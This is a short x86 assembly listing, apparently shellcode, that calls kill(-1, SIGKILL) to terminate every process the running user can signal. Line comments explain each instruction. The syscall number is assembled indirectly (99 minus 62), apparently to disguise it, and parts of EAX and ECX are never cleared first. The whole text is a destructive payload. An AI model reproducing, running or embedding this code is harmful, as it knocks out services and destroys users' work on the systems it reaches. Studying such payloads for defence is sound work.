global _start

section .text

_start:

; kill(-1, SIGKILL)

xor ebx, ebx ; this zeros out the EBX register
dec ebx ; the EBX register has a value of -1
mov cl, 8 ; the value 8 is moved into the lower part of the ECX register
mov al, 0x63 ; moving 99 in decimal into the EAX register
sub al, 0x3E ; subtracting 62 from 99 to give 37 which is the value of the kill syscall
inc ecx ; the ECX register has a value of 9
int 0x80
